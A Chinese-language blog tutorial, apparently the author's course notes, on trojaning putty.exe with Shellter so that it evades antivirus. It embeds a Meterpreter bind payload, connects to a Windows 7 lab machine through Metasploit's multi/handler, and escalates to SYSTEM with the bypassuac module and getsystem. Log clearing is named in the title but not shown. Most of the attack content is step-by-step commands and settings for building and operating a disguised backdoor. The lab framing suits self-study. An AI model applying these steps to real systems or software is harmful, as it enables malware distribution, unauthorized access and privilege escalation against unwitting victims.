+++
title = 'Metasploit 基础使用 handler 连接 win7 并提权清除日志'
date = 2020-12-11T15:55:33+08:00
draft = true
categories = ["运维"]
tags = ["信息安全","Linux"]
+++
#### 简介

目前根据 [i 春秋][] 进行学习,目前到利用 [shellter][] 进行文件捆绑木马并达到免查杀的效果, 在使用 [metasploit][] 对指定目标机进行监听获取权限.利用打包好的漏洞程序进行提权并清除日志信息.这里我们的步骤是根据这个 [来源][] 学习进行的.
<!-- more -->
-------------------------

#### 操作环境

- kali 2020.4
- shellter 7.2-amd64
  - wine \ wine64 \ wine32
- metasploit  6.0.18-dev
- win 7 企业版
- 注:请特别注意关闭 *win7* 的防火墙,不要说为什么我的没有用连接不上

---------

#### 具体操作

首先下载 [putty.exe][] , 使用 *shellter* 进行木马封装,记住这些我们都是在 *kali* 虚拟机下完成的; *kali 2020.4* 并没有预安装 *shellter* 使用了 `sudo apt-get install shellter` 进行安装, 安装完了之后控制台返回了一个错误信息,希望我们添加 *32* 位的资源并且下载 *wine32* (这里的具体命令我记得并不是很清晰了,请自行看控制台).

安装好了 *shellter* 之后我们在终端输入 `sudo shellter` 会出现一个新的窗口, 这里会出现一些选择 (请参考下图), 目前我了解的 `a` 代表的是 *auto* 自动的意思. 而这里的 `m` 似乎代表的是 *manual*, 这里我们仅说明自动的操作. 选择自动模式后我们输入一个 [绝对路径][] (这里如果没有使用 *root* 权限执行 *shellter* 那么会提示让你权限不足).

![shellter-1][]

我们设置好了文件路径之后,继续输入 `y` 以及英文字母 `l`, 这时候需要选择具体的连接方式

- *Meterpreter_Reverse_TCP*
- *Meterpreter_Reverse_HTTP*
- *Meterpreter_Reverse_HTTPS*
- *Meterpreter_Bind_TCP*
- *Shell_Reverse_TCP*
- *Shell_Bind_Tcp*
- *WinExec*

首先我们说明选项中带有 *Meterperter* 表示支持使用 *Metasploit* 中的模块(推荐,提权之类的需要,漏洞利用); *Shell* 顾名思义就是一个 *shell* 对话框; 这里面还有 *Reverse* 和 *Bind* 这两种模式 **反向连接** 和 **正向连接**, 反向的意思是目标机运行文件之后主动连接我们, 正向是目标运行文件之后开放端口等待我们进行连接. 这里教程选择 *4*, 这里暂不做扩展.

后续输入的 *0.0.0.0* 表示任何 *IP* 都可以访问, *65500* 代表开放的端口等待控制

![shellter-2][]

![shellter-3][]

这里我们需要运行 *Metasploit* 使用指定模块进行目标机的监听

- `msfconsole`
- `use exploit/multi/handler`
- `set payload windows/meterpreter/bind_tcp`
- `show options`
- `set RHOST [IP]`
  - 请替换成你目标机的 *IP*, 不懂的话可以点击 *win7* 系统桌面下角的开始按键, 输入 `cmd` 你会获得一个黑窗口输入 `ipconfig`
- `set LPORT 65500`
  - 这个 *65500* 是根据三方第三张图中 *shellter* 之前设置的

- `exploit`

![msfconsole-1][]

目标机被执行了我们的程序之后我们的监听状态的就会自动连接,但是现在的执行的用户并不总是 *Administrator* 那么我们就需要提权,我们可以先执行 `background` 然后使用 *exploit/windows/local/bypassuac* 这个模板进行提权,源博客 [提权教程博客][].

```shell
meterpreter > background
msf6 exploit(multi/handler) > exploit/windows/local/bypassuac
msf6 exploit(windows/local/bypassuac) > sessions -l#这个会显示当前监听连接的列表以便 exploit/windows/local/bypassuac 的 session 参数赋值
msf6 exploit(windows/local/bypassuac) > set SESSION 1
msf6 exploit(windows/local/bypassuac) > sessions 1
meterpreter > getuid
meterpreter > getsystem
```

![msfconsole-2][]

![msfconsole-3][]





[i 春秋]: https://www.ichunqiu.com/course/58625
[shellter]: https://www.shellterproject.com/download/
[metasploit]: https://baike.baidu.com/item/Metasploit/4926164?fr=aladdin
[来源]: http://codefocus.top/?p=121
[putty.exe]: https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe "这个是官网的下载链接,如果下载网速有问题的请自行寻找资源"
[绝对路径]: https://baike.baidu.com/item/%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84/481185?fr=aladdin
[提权教程博客]: http://codefocus.top/?m=201704





[shellter-1]: https://images.ha0zi.com/note/2024/04/27/image-20240427214157637.png
[shellter-2]: https://images.ha0zi.com/note/2024/04/27/image-20240427214034077.png
[shellter-3]: https://images.ha0zi.com/note/2024/04/27/image-20240427213932554.png
[msfconsole-1]:  https://images.ha0zi.com/note/2024/04/27/image-20240427213834790.png
[msfconsole-2]: https://images.ha0zi.com/note/2024/04/27/image-20240427213414117.png
[msfconsole-3]: https://images.ha0zi.com/note/2024/04/27/image-20240427213617060.png
